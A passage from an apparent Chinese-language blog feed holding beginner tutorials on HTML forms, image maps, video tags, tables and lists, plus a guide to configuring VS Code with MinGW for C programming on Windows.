class="name">option</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">option</span>&gt;</span>选择4<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 与上面不同的是可以不选择提供的选项，而输入自己的选项 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">list</span>=<span class="string">"testList"</span> <span class="attr">placeholder</span>=<span class="string">"请输入你的选择"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">datalist</span> <span class="attr">id</span>=<span class="string">"testList"</span>&gt;</span><span class="comment">&lt;!-- 必须配合type="text"来使用，否则不会单独显示 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">option</span>&gt;</span>选择1<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">option</span>&gt;</span>选择2<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">option</span>&gt;</span>选择3<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">option</span>&gt;</span>选择4<span class="tag">&lt;/<span class="name">option</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;/<span class="name">datalist</span>&gt;</span></span><br><span class="line">        </span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"date"</span>&gt;</span><span class="comment">&lt;!-- 日期类型 不支持IE，火狐浏览器 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"search"</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 用户虽然看不到，但是提交表单的时候会把value值一起提交 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">value</span>=<span class="string">"隐藏的内容"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"image"</span> <span class="attr">src</span>=<span class="string">"password.png"</span> <span class="attr">width</span>=<span class="string">"20px"</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 如果要上传文件的话，必须设置属性 form enctype="multipart/form-data" --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">multiple</span>&gt;</span><span class="comment">&lt;!-- multiple是指支持多个文件上传 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">required</span>&gt;</span><span class="comment">&lt;!-- required是指必须上传文件 --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>



</li>
</ul>
<h2 id="创建分区响应图"><a href="#创建分区响应图" class="headerlink" title="创建分区响应图"></a>创建分区响应图</h2><p>分区响应图是指：将一张图片进行划分，用户点击不同的区域的时候，触发不同的点击事件。</p>
<p>该图需要设置usemap属性，属性值是一个map的ID名，map由area组成，即area是触发点击的区域，而area的shape属性说明由下表给出：</p>
<table border="1px">
        <tr>
            <!-- 行 -->
            <th>shape的值</th> <!-- 表头 -->
            <th>coords属性解释</th>
        </tr>
        <tr>
            <!-- 第二行 -->
            <td>Rect</td><!-- 单元格 -->
            <td>这个值代表矩形区域，用四个逗号分割的整数描述，即
                图像左边缘
                图像上边缘
                图像右边缘
                图像下边缘
            </td><!-- 单元格 -->
        </tr>
        <tr>
            <!-- 第三行 -->
            <td>Circle</td><!-- 单元格 -->
            <td>这个值代表圆形区域，用三个逗号分割的整数描述，即
                图像左边缘到圆心的距离
                图像上边缘到圆心的距离
                圆的半径
            </td><!-- 单元格 -->
        </tr>
        <tr>
            <!-- 第四行 -->
            <td>Poly</td><!-- 单元格 -->
            <td>这个值代表多边形区域，用至少六个逗号分割的整数描述，每一个数字表示多边形的一个顶点
            </td><!-- 单元格 -->
        </tr>
        <tr>
            <!-- 第五行 -->
            <td>Default</td><!-- 单元格 -->
            <td>这个值代表默认区域，不需要设置coords的值，即默认覆盖整张图片
            </td><!-- 单元格 -->
        </tr>
</table>

<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"OIP.png"</span> <span class="attr">usemap</span>=<span class="string">"#test_map"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">map</span> <span class="attr">name</span>=<span class="string">"test_map"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">area</span> <span class="attr">href</span>=<span class="string">"4.html"</span> <span class="attr">shape</span>=<span class="string">"rect"</span> <span class="attr">coords</span>=<span class="string">"4,10,63,66"</span> <span class="attr">target</span>=<span class="string">"_blank"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">area</span> <span class="attr">href</span>=<span class="string">"9.html"</span> <span class="attr">shape</span>=<span class="string">"rect"</span> <span class="attr">coords</span>=<span class="string">"64,10,120,66"</span> <span class="attr">target</span>=<span class="string">"_blank"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">map</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="载入视频"><a href="#载入视频" class="headerlink" title="载入视频"></a>载入视频</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">src</span>=<span class="string">"test_video.mp4"</span> <span class="attr">controls</span> <span class="attr">poster</span>=<span class="string">"cut.png"</span>&gt;</span><span class="tag">&lt;/<span class="name">video</span>&gt;</span></span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>属性</th>
<th>属性介绍</th>
</tr>
</thead>
<tbody><tr>
<td>src</td>
<td>视频地址</td>
</tr>
<tr>
<td>width</td>
<td>视频宽度</td>
</tr>
<tr>
<td>height</td>
<td>视频高度</td>
</tr>
<tr>
<td>autoplay</td>
<td>网页完成后自动播放</td>
</tr>
<tr>
<td>preload</td>
<td>是否在页面加载后载入视频。<br>auto - 当页面加载后载入整个视频<br>metadata- 当页面加载后只载入第一帧<br>none - 当页面加载后不载入视频</td>
</tr>
<tr>
<td>controls</td>
<td>向用户显示控件，比如播放按钮</td>
</tr>
<tr>
<td>loop</td>
<td>当媒介文件完成播放后再次开始播放。</td>
</tr>
<tr>
<td>poster</td>
<td>视频封面</td>
</tr>
</tbody></table>
<p>由于不同的浏览器支持的视频格式不一样，同一款浏览器版本不同，支持的视频格式也不同，但是MP4格式和ogg格式的视频几乎覆盖了大多数浏览器的大多数版本，因此一般在载入视频的地方准备好两种素材就可以了</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">src</span>=<span class="string">"test_video.mp4"</span> <span class="attr">controls</span> <span class="attr">poster</span>=<span class="string">"cut.png"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">source</span> <span class="attr">src</span>=<span class="string">"test_video.mp4"</span> <span class="attr">type</span>=<span class="string">"video/mp4"</span>&gt;</span> <span class="comment">&lt;!-- 默认使用这个资源播放，播放失败则播放下面的 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">source</span> <span class="attr">src</span>=<span class="string">"test_video.ogg"</span> <span class="attr">type</span>=<span class="string">"video/ogg"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">video</span>&gt;</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Web基础</category>
      </categories>
      <tags>
        <tag>html基础</tag>
      </tags>
  </entry>
  <entry>
    <title>html语法一</title>
    <url>/2020/03/07/html%E8%AF%AD%E6%B3%951/</url>
    <content><![CDATA[<h2 id="最简单的meno"><a href="#最简单的meno" class="headerlink" title="最简单的meno"></a>最简单的meno</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span><span class="comment">&lt;!-- 文档中html开始的部分 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span> <span class="comment">&lt;!-- 提供有关文档内容和标注信息 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span><span class="comment">&lt;!-- 编码 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        hello world</span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span><span class="comment">&lt;!-- 文档中html的结束 --&gt;</span></span><br></pre></td></tr></table></figure>

<a id="more"></a>

<p>HTML常用的标签分为：行标签和块标签：</p>
<ul>
<li>行标签： 在一行内显示、不可以进行宽高的数值设定； </li>
<li>块标签： 独自占领一行、可以进行宽高的数值的设定； </li>
</ul>
<p>先介绍行标签</p>
<h2 id="行标签"><a href="#行标签" class="headerlink" title="行标签"></a>行标签</h2><h3 id="超链接标签"><a href="#超链接标签" class="headerlink" title="超链接标签"></a>超链接标签</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"https://yalexin.gitee.io/"</span>&gt;</span>博客链接<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="comment">&lt;!-- URL外部链接 --&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="加粗标签"><a href="#加粗标签" class="headerlink" title="加粗标签"></a>加粗标签</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">b</span>&gt;</span>加粗<span class="tag">&lt;/<span class="name">b</span>&gt;</span><span class="comment">&lt;!-- 加粗标签 --&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="斜体标签"><a href="#斜体标签" class="headerlink" title="斜体标签"></a>斜体标签</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">em</span>&gt;</span>斜体<span class="tag">&lt;/<span class="name">em</span>&gt;</span><span class="comment">&lt;!-- 斜体标签 --&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="下划线标签"><a href="#下划线标签" class="headerlink" title="下划线标签"></a>下划线标签</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">u</span>&gt;</span>下划线<span class="tag">&lt;/<span class="name">u</span>&gt;</span><span class="comment">&lt;!-- 下划线标签 --&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="中划线标签"><a href="#中划线标签" class="headerlink" title="中划线标签"></a>中划线标签</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">s</span>&gt;</span>中划线<span class="tag">&lt;/<span class="name">s</span>&gt;</span><span class="comment">&lt;!-- 中划线标签 --&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="图片标签"><a href="#图片标签" class="headerlink" title="图片标签"></a>图片标签</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"hello.png"</span> <span class="attr">width</span>=<span class="string">"50px"</span>&gt;</span><span class="comment">&lt;!-- width/height只设置其中之一的时候，会按照原比例自动缩放 --&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="块标签"><a href="#块标签" class="headerlink" title="块标签"></a>块标签</h2><h3 id="div标签"><a href="#div标签" class="headerlink" title="div标签"></a>div标签</h3><p> 划分块的主要使用标签<br> <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<h3 id="表格标签"><a href="#表格标签" class="headerlink" title="表格标签"></a>表格标签</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 文档中html开始的部分 --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 提供有关文档内容和标注信息 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span><span class="comment">&lt;!-- 编码 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">table</span> <span class="attr">border</span>=<span class="string">"1px"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 行 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">th</span>&gt;</span>第一个表头<span class="tag">&lt;/<span class="name">th</span>&gt;</span> <span class="comment">&lt;!-- 表头 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">th</span>&gt;</span>第二个表头<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">th</span>&gt;</span>第三个表头<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 第二行 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>单元格<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="comment">&lt;!-- 单元格 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>单元格<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="comment">&lt;!-- 单元格 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>单元格<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="comment">&lt;!-- 单元格 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span><span class="comment">&lt;!-- 文档中html的结束 --&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="单元格合并"><a href="#单元格合并" class="headerlink" title="单元格合并"></a>单元格合并</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">td</span> <span class="attr">colspan</span>=<span class="string">"2"</span>&gt;</span>行合并的单元格<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="comment">&lt;!-- 单元格 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span> <span class="attr">rowspan</span>=<span class="string">"2"</span>&gt;</span>列合并单元格<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="comment">&lt;!-- 单元格 --&gt;</span></span><br></pre></td></tr></table></figure>

<p>使用单元格合并时，被合并的地方的单元格要相应地删去</p>
<h3 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h3><ul>
<li><p>有序列表</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ol</span> <span class="attr">type</span>=<span class="string">"1"</span>&gt;</span><span class="comment">&lt;!-- type指定序号样式，默认是十进制阿拉比数字。 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>第一<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>第二<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ol</span> <span class="attr">type</span>=<span class="string">"A"</span>&gt;</span><span class="comment">&lt;!-- 嵌套 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>第一<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>第二<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ol</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>第三<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ol</span>&gt;</span></span><br></pre></td></tr></table></figure>


</li>
</ul>
<ul>
<li><p>无序列表</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>第一<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span>&gt;</span>第二<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span> <span class="attr">type</span>=<span class="string">"A"</span>&gt;</span><span class="comment">&lt;!-- 嵌套 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>第一<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>第二<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>第三<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br></pre></td></tr></table></figure>



</li>
</ul>
]]></content>
      <categories>
        <category>Web基础</category>
      </categories>
      <tags>
        <tag>html基础</tag>
      </tags>
  </entry>
  <entry>
    <title>vs code（Windows）配置C环境</title>
    <url>/2020/03/07/vs-code%EF%BC%88Windows%EF%BC%89%E9%85%8D%E7%BD%AEC-C-%E7%8E%AF%E5%A2%83/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在前端开发中，有一个非常好用的工具，Visual Studio Code，简称VS code。  它是微软出的一款轻量级代码编辑器，免费而且功能强大，对JavaScript和NodeJS的支持非常好，自带很多功能，例如代码格式化，代码智能提示补全、Emmet插件等。 无数个大言不惭的攻城狮，都被VS code比德芙还丝滑的强大功能所折服。 本篇文章主要是介绍如何配置Windows系统下C环境的配置，C++的配置类似，这里就不再重复。</p>
<a id="more"></a>

<h2 id="1-下载vs-code"><a href="#1-下载vs-code" class="headerlink" title="1.下载vs code"></a>1.下载vs code</h2><p>这里给出<a href="https://code.visualstudio.com/" target="_blank" rel="noopener">官网链接</a></p>
<h2 id="2-下载mingw"><a href="#2-下载mingw" class="headerlink" title="2.下载mingw"></a>2.下载mingw</h2><p>这里给出<a href="http://mingw.org/" target="_blank" rel="noopener">官网链接</a>，如果官网下载太慢，也可以<a href="i686-8.1.0-release-posix-dwarf-rt_v6-rev0.7z">点此下载</a>，然后解压到自己喜欢的地方，但最好路径中不要含有中文。</p>
<h2 id="3-下载插件"><a href="#3-下载插件" class="headerlink" title="3.下载插件"></a>3.下载插件</h2><ul>
<li><p>cpptools</p>
<p>  下载不了的可以从这里下载<a href="http://q78fmp2j4.bkt.clouddn.com/cpptools-win32.vsix" target="_blank" rel="noopener">离线包</a>，在vs code中选择“从VSIX安装”即可</p>
</li>
<li><p>Chinese (Simplified) Language（可选）</p>
</li>
<li><p>Bracket Pair Colorizer（可选）</p>
</li>
</ul>
<img src="/2020/03/07/vs-code%EF%BC%88Windows%EF%BC%89%E9%85%8D%E7%BD%AEC-C-%E7%8E%AF%E5%A2%83/TIM%E6%88%AA%E5%9B%BE20200307102836.png" class>

<h2 id="4-配置环境"><a href="#4-配置环境" class="headerlink" title="4.配置环境"></a>4.配置环境</h2><ol>
<li><p>新建测试文件test.c</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @Description: </span></span><br><span class="line"><span class="comment"> * @Author: Yale_Xin</span></span><br><span class="line"><span class="comment"> * @Date: 2020-03-07 10:31:47</span></span><br><span class="line"><span class="comment"> * @LastEditTime: 2020-03-07 10:31:47</span></span><br><span class="line"><span class="comment"> * @LastEditors: Yale_Xin</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"hello world"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>配置launch.json</p>
<p>编写完毕上面的代码，然后按下F5，弹出选择环境</p>
<img src="/2020/03/07/vs-code%EF%BC%88Windows%EF%BC%89%E9%85%8D%E7%BD%AEC-C-%E7%8E%AF%E5%A2%83/TIM%E6%88%AA%E5%9B%BE20200307103653.png" class>

<p>这里选择第一个，然后选择默认配置</p>
<img src="/2020/03/07/vs-code%EF%BC%88Windows%EF%BC%89%E9%85%8D%E7%BD%AEC-C-%E7%8E%AF%E5%A2%83/TIM%E6%88%AA%E5%9B%BE20200307103911.png" class>

<p>系统就会自动为我们自动生成launch.json，接着把下面的代码粘贴覆盖进去即可：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">"version"</span>: <span class="string">"0.2.0"</span>,</span><br><span class="line">    <span class="string">"configurations"</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">"name"</span>: <span class="string">"C++ Launch (GDB)"</span>,                 <span class="comment">// 配置名称，将会在启动配置的下拉菜单中显示</span></span><br><span class="line">            <span class="string">"type"</span>: <span class="string">"cppdbg"</span>,                           <span class="comment">// 配置类型，这里只能为cppdbg</span></span><br><span class="line">            <span class="string">"request"</span>: <span class="string">"launch"</span>,                        <span class="comment">// 请求配置类型，可以为launch（启动）或attach（附加）</span></span><br><span class="line">            <span class="string">"launchOptionType"</span>: <span class="string">"Local"</span>,                <span class="comment">// 调试器启动类型，这里只能为Local</span></span><br><span class="line">            <span class="string">"targetArchitecture"</span>: <span class="string">"x86"</span>,                <span class="comment">// 生成目标架构，一般为x86或x64，可以为x86, arm, arm64, mips, x64, amd64, x86_64</span></span><br><span class="line">            <span class="string">"program"</span>:   <span class="string">"$&#123;fileDirname&#125;/$&#123;fileBasenameNoExtension&#125;.exe"</span>,                   <span class="comment">// 将要进行调试的程序的路径</span></span><br><span class="line">            <span class="string">"miDebuggerPath"</span>:<span class="string">"D:/mingw32/bin/gdb.exe"</span>, <span class="comment">// ******************miDebugger的路径，注意这里要与MinGw的路径对应</span></span><br><span class="line">            <span class="string">"args"</span>: [],     <span class="comment">// 程序调试时传递给程序的命令行参数，一般设为空即可</span></span><br><span class="line">            <span class="string">"stopAtEntry"</span>: <span class="literal">false</span>,                       <span class="comment">// 设为true时程序将暂停在程序入口处，一般设置为false</span></span><br><span class="line">            <span class="string">"cwd"</span>: <span class="string">"$&#123;workspaceRoot&#125;"</span>,                  <span class="comment">// 调试程序时的工作目录，一般为$&#123;workspaceRoot&#125;即代码所在目录</span></span><br><span class="line">            <span class="string">"externalConsole"</span>: <span class="literal">true</span>,                    <span class="comment">// 调试时是否显示控制台窗口，一般设置为true显示控制台</span></span><br><span class="line">            <span class="string">"preLaunchTask"</span>: <span class="string">"gcc"</span>　　                  <span class="comment">// *********调试会话开始前执行的任务，一般为编译程序，c++为g++, c为gcc</span></span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>接着将miDebuggerPath的值改为你的MinGw路径。</strong></p>
</li>
<li><p>配置tasks.json</p>
<p>回到test.c，按下F5，你会发现还是不能编译运行我们的程序，别急，我们还需要配置tasks.json，</p>
<p>点击弹出来的信息框中的“配置任务”</p>
<img src="/2020/03/07/vs-code%EF%BC%88Windows%EF%BC%89%E9%85%8D%E7%BD%AEC-C-%E7%8E%AF%E5%A2%83/TIM%E6%88%AA%E5%9B%BE20200307104828.png" class>

<p>选择“使用模板”</p>
<img src="/2020/03/07/vs-code%EF%BC%88Windows%EF%BC%89%E9%85%8D%E7%BD%AEC-C-%E7%8E%AF%E5%A2%83/TIM%E6%88%AA%E5%9B%BE20200307104850.png" class>

<p>选择第一个</p>
<img src="/2020/03/07/vs-code%EF%BC%88Windows%EF%BC%89%E9%85%8D%E7%BD%AEC-C-%E7%8E%AF%E5%A2%83/TIM%E6%88%AA%E5%9B%BE20200307104917.png" class>

<p>然后在生成的tasks中粘贴覆盖下面的代码即可</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"version"</span>: <span class="string">"2.0.0"</span>,</span><br><span class="line">    <span class="attr">"tasks"</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">"label"</span>: <span class="string">"gcc"</span>,</span><br><span class="line">            <span class="attr">"command"</span>: <span class="string">"gcc"</span>,</span><br><span class="line">            <span class="attr">"args"</span>: [</span><br><span class="line">                <span class="string">"$&#123;file&#125;"</span>,</span><br><span class="line">                <span class="string">"-o"</span>,</span><br><span class="line">                <span class="string">"$&#123;fileDirname&#125;/$&#123;fileBasenameNoExtension&#125;.exe"</span>,</span><br><span class="line">                <span class="string">"-g"</span>,</span><br><span class="line">            ],</span><br><span class="line">            <span class="attr">"type"</span>: <span class="string">"shell"</span>,</span><br><span class="line">            <span class="attr">"group"</span>: &#123;</span><br><span class="line">                <span class="attr">"kind"</span>: <span class="string">"build"</span>,</span><br><span class="line">                <span class="attr">"isDefault"</span>: <span class="literal">true</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">"presentation"</span>: &#123;</span><br><span class="line">                <span class="attr">"echo"</span>: <span class="literal">true</span>,</span><br><span class="line">                <span class="attr">"reveal"</span>: <span class="string">"always"</span>,</span><br><span class="line">                <span class="attr">"focus"</span>: <span class="literal">false</span>,</span><br><span class="line">                <span class="attr">"panel"</span>: <span class="string">"shared"</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">"type"</span>: <span class="string">"shell"</span>,</span><br><span class="line">            <span class="attr">"label"</span>: <span class="string">"gcc.exe build active file"</span>,</span><br><span class="line">            <span class="attr">"command"</span>: <span class="string">"D:\\mingw32\\bin\\gcc.exe"</span>,<span class="comment">//**********这里要改你的路径</span></span><br><span class="line">            <span class="attr">"args"</span>: [</span><br><span class="line">                <span class="string">"-g"</span>,</span><br><span class="line">                <span class="string">"$&#123;file&#125;"</span>,</span><br><span class="line">                <span class="string">"-o"</span>,</span><br><span class="line">                <span class="string">"$&#123;fileDirname&#125;\\$&#123;fileBasenameNoExtension&#125;.exe"</span></span><br><span class="line">            ],</span><br><span class="line">            <span class="attr">"options"</span>: &#123;</span><br><span class="line">                <span class="attr">"cwd"</span>: <span class="string">"D:\\mingw32\\bin"</span><span class="comment">//**********这里要改你的路径</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">"problemMatcher"</span>: [</span><br><span class="line">                <span class="string">"$gcc"</span></span><br><span class="line">            ],</span><br><span class="line">            <span class="attr">"group"</span>: <span class="string">"build"</span></span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>接着将代码中注释部分相应地改为你的路径即可。</strong></p>
</li>
</ol>
<h2 id="5-成功！"><a href="#5-成功！" class="headerlink" title="5.成功！"></a>5.成功！</h2><p>然后你再测试你的test.c，发现可以成功了，但是命令窗口一闪而过，解决的办法是在return语句之前加</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">system(<span class="string">"pause"</span>);</span><br></pre></td></tr></table></figure>

<p>我更推荐使用断点功能来完成</p>
